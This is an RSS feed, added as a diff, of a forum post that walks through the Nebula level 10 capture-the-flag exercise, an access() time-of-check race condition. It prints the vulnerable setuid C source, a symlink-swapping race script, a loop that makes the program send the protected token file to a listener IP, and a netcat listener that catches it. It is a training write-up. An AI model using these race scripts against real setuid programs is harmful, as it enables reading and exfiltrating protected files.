@@ -1,0 +1,319 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>How to pwned Nebula : Level10 - access() Race condition</title>
+    <link>https://d.clarkee.co.uk/t/how-to-pwned-nebula-level10-access-race-condition/1693</link>
+    <description># Exploit-Exercice : Nebula
+---
+
+## Level10 - access() Race condition
+
+Hi everyone ! I hope your ready to hack nebula because this exploit is a fun one !
+
+In today&#39;s Tutorial we will learn how to exploit a bad implementation of access() and get the flag 
+
+Let&#39;s begin !
+
+## The Source code 
+
+exploit-exercice provides us the C source code of the vulnerable program. Let&#39;s read the code and understand what the heck is going on.
+
+```c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+  char *file; 
+  char *host;
+
+  if(argc &lt; 3) {
+      printf(&quot;%s file host\n\tsends file to host if you have access to it\n&quot;, argv[0]);
+      exit(1);
+  }
+  
+  file = argv[1];
+  host = argv[2];
+
+  if(access(argv[1], R_OK) == 0) {
+      int fd;
+      int ffd;
+      int rc;
+      struct sockaddr_in sin;
+      char buffer[4096];
+
+      printf(&quot;Connecting to %s:18211 .. &quot;, host); fflush(stdout);
+
+      fd = socket(AF_INET, SOCK_STREAM, 0);
+
+      memset(&amp;sin, 0, sizeof(struct sockaddr_in));
+      sin.sin_family = AF_INET;
+      sin.sin_addr.s_addr = inet_addr(host);
+      sin.sin_port = htons(18211);
+
+      if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
+          printf(&quot;Unable to connect to host %s\n&quot;, host);
+          exit(EXIT_FAILURE);
+      }
+
+#define HITHERE &quot;.oO Oo.\n&quot;
+      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+          printf(&quot;Unable to write banner to host %s\n&quot;, host);
+          exit(EXIT_FAILURE);
+      }
+#undef HITHERE
+
+      printf(&quot;Connected!\nSending file .. &quot;); fflush(stdout);
+
+      ffd = open(file, O_RDONLY);
+      if(ffd == -1) {
+          printf(&quot;Damn. Unable to open file\n&quot;);
+          exit(EXIT_FAILURE);
+      }
+
+      rc = read(ffd, buffer, sizeof(buffer));
+      if(rc == -1) {
+          printf(&quot;Unable to read from file: %s\n&quot;, strerror(errno));
+          exit(EXIT_FAILURE);
+      }
+
+      write(fd, buffer, rc);
+
+      printf(&quot;wrote file!\n&quot;);
+
+  } else {
+      printf(&quot;You don&#39;t have access to %s\n&quot;, file);
+  }
+}
+```
+
+The important function in this program are **access()** and **open()**
+
+Let&#39;s read the man page of access() and open()
+
+Here the imporant lines in the man page for the access function : 
+
+&gt; 
+*access()*  checks  whether the calling process can access the file path-
+       name.
+
+
+&gt;
+The check is done using the calling process&#39;s real UID and GID,  rather
+       than the effective IDs as is done when actually attempting an operation
+       (e.g., open(2)) on the file.  This allows set-user-ID programs to  eas-
+       ily determine the invoking user&#39;s authority.
+
+if we use a file that we own as an argument, the program will read it and send it
+if we&#39;re no supposed to read the file we&#39;ll have an access denied.
+
+## How can we read the token ? 
+
+
+We need to pass the access check, so here how the attack will work
+
+
+1. Create a file
+Making a while loop that
+  1. Create a symlink to our file
+  2. Create a symlink to the *token*
+
+```sh
+#!/bin/sh
+touch HackyFile
+touch /tmp/hackfile
+while true; do
+    ln -sf HackyFile /tmp/hackfile
+    ln -sf token /tmp/hackfile
+done
+```
+Here another script to run the program in an infinite loop we will call this program runit.sh
+```bash
+#!/bin/sh
+while true; do
+    /home/flag10/flag10 /tmp/hackfile ip_of_our_listener
+done
+```
+
+With another pc , open nc 
+
+```bash
+while true; nc -lvp 18211; done
+```
+
+*This is not the best way ^^^ but you get the idea*
+
+now just run the two script we created
+
+```bash
+./exploit.sh &amp;
+./runit.sh &amp;
+```
+
+Enjoy the flag 
+*Note you will need to do a ctrl+z to stop the netcat program*
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/1/164da6f5e959fbdd564a1d0af0dcf2e2e0d9e1c6.png&quot; width=&quot;690&quot; height=&quot;403&quot;&gt;</description>
+    
+    <lastBuildDate>Thu, 23 Feb 2017 17:07:31 +0000</lastBuildDate>
+    <category>CTF</category>
+    <atom:link href="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level10-access-race-condition/1693.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>How to pwned Nebula : Level10 - access() Race condition</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level10-access-race-condition/1693/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/how-to-pwned-nebula-level10-access-race-condition/1693/2</link>
+        <pubDate>Sun, 21 Jan 2018 00:42:57 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1693-2</guid>
+        <source url="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level10-access-race-condition/1693.rss">How to pwned Nebula : Level10 - access() Race condition</source>
+      </item>
+      <item>
+        <title>How to pwned Nebula : Level10 - access() Race condition</title>
+        <dc:creator><![CDATA[L3akM3-0day]]></dc:creator>
+        <description><![CDATA[
+            <h1><a name="p-7946-exploit-exercice-nebula-1" class="anchor" href="https://d.clarkee.co.uk#p-7946-exploit-exercice-nebula-1"></a>Exploit-Exercice : Nebula</h1>
+<hr>
+<h2><a name="p-7946-level10-access-race-condition-2" class="anchor" href="https://d.clarkee.co.uk#p-7946-level10-access-race-condition-2"></a>Level10 - access() Race condition</h2>
+<p>Hi everyone ! I hope your ready to hack nebula because this exploit is a fun one !</p>
+<p>In today’s Tutorial we will learn how to exploit a bad implementation of access() and get the flag</p>
+<p>Let’s begin !</p>
+<h2><a name="p-7946-the-source-code-3" class="anchor" href="https://d.clarkee.co.uk#p-7946-the-source-code-3"></a>The Source code</h2>
+<p>exploit-exercice provides us the C source code of the vulnerable program. Let’s read the code and understand what the heck is going on.</p>
+<pre data-code-wrap="c"><code class="lang-c">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+  char *file; 
+  char *host;
+
+  if(argc &lt; 3) {
+      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
+      exit(1);
+  }
+  
+  file = argv[1];
+  host = argv[2];
+
+  if(access(argv[1], R_OK) == 0) {
+      int fd;
+      int ffd;
+      int rc;
+      struct sockaddr_in sin;
+      char buffer[4096];
+
+      printf("Connecting to %s:18211 .. ", host); fflush(stdout);
+
+      fd = socket(AF_INET, SOCK_STREAM, 0);
+
+      memset(&amp;sin, 0, sizeof(struct sockaddr_in));
+      sin.sin_family = AF_INET;
+      sin.sin_addr.s_addr = inet_addr(host);
+      sin.sin_port = htons(18211);
+
+      if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
+          printf("Unable to connect to host %s\n", host);
+          exit(EXIT_FAILURE);
+      }
+
+#define HITHERE ".oO Oo.\n"
+      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+          printf("Unable to write banner to host %s\n", host);
+          exit(EXIT_FAILURE);
+      }
+#undef HITHERE
+
+      printf("Connected!\nSending file .. "); fflush(stdout);
+
+      ffd = open(file, O_RDONLY);
+      if(ffd == -1) {
+          printf("Damn. Unable to open file\n");
+          exit(EXIT_FAILURE);
+      }
+
+      rc = read(ffd, buffer, sizeof(buffer));
+      if(rc == -1) {
+          printf("Unable to read from file: %s\n", strerror(errno));
+          exit(EXIT_FAILURE);
+      }
+
+      write(fd, buffer, rc);
+
+      printf("wrote file!\n");
+
+  } else {
+      printf("You don't have access to %s\n", file);
+  }
+}
+</code></pre>
+<p>The important function in this program are <strong>access()</strong> and <strong>open()</strong></p>
+<p>Let’s read the man page of access() and open()</p>
+<p>Here the imporant lines in the man page for the access function :</p>
+<blockquote></blockquote>
+<p><em>access()</em>  checks  whether the calling process can access the file path-<br>
+name.</p>
+<blockquote></blockquote>
+<p>The check is done using the calling process’s real UID and GID,  rather<br>
+than the effective IDs as is done when actually attempting an operation<br>
+(e.g., open(2)) on the file.  This allows set-user-ID programs to  eas-<br>
+ily determine the invoking user’s authority.</p>
+<p>if we use a file that we own as an argument, the program will read it and send it<br>
+if we’re no supposed to read the file we’ll have an access denied.</p>
+<h2><a name="p-7946-how-can-we-read-the-token-4" class="anchor" href="https://d.clarkee.co.uk#p-7946-how-can-we-read-the-token-4"></a>How can we read the token ?</h2>
+<p>We need to pass the access check, so here how the attack will work</p>
+<ol>
+<li>Create a file<br>
+Making a while loop that</li>
+<li>Create a symlink to our file</li>
+<li>Create a symlink to the <em>token</em></li>
+</ol>
+<pre data-code-wrap="sh"><code class="lang-sh">#!/bin/sh
+touch HackyFile
+touch /tmp/hackfile
+while true; do
+    ln -sf HackyFile /tmp/hackfile
+    ln -sf token /tmp/hackfile
+done
+</code></pre>
+<p>Here another script to run the program in an infinite loop we will call this program runit.sh</p>
+<pre data-code-wrap="bash"><code class="lang-bash">#!/bin/sh
+while true; do
+    /home/flag10/flag10 /tmp/hackfile ip_of_our_listener
+done
+</code></pre>
+<p>With another pc , open nc</p>
+<pre data-code-wrap="bash"><code class="lang-bash">while true; nc -lvp 18211; done
+</code></pre>
+<p><em>This is not the best way ^^^ but you get the idea</em></p>
+<p>now just run the two script we created</p>
+<pre data-code-wrap="bash"><code class="lang-bash">./exploit.sh &amp;
+./runit.sh &amp;
+</code></pre>
+<p>Enjoy the flag<br>
+<em>Note you will need to do a ctrl+z to stop the netcat program</em><br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/1/164da6f5e959fbdd564a1d0af0dcf2e2e0d9e1c6.png" data-download-href="/uploads/short-url/3biS9lv0UTWCegEx3nMwffjZz8y.png?dl=1" title="image.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/1/164da6f5e959fbdd564a1d0af0dcf2e2e0d9e1c6.png" width="690" height="403"></a></div><p></p>
+          <p><a href="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level10-access-race-condition/1693/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/how-to-pwned-nebula-level10-access-race-condition/1693/1</link>
+        <pubDate>Thu, 23 Feb 2017 16:55:22 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1693-1</guid>
+        <source url="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level10-access-race-condition/1693.rss">How to pwned Nebula : Level10 - access() Race condition</source>
+      </item>
+  </channel>
+</rss>
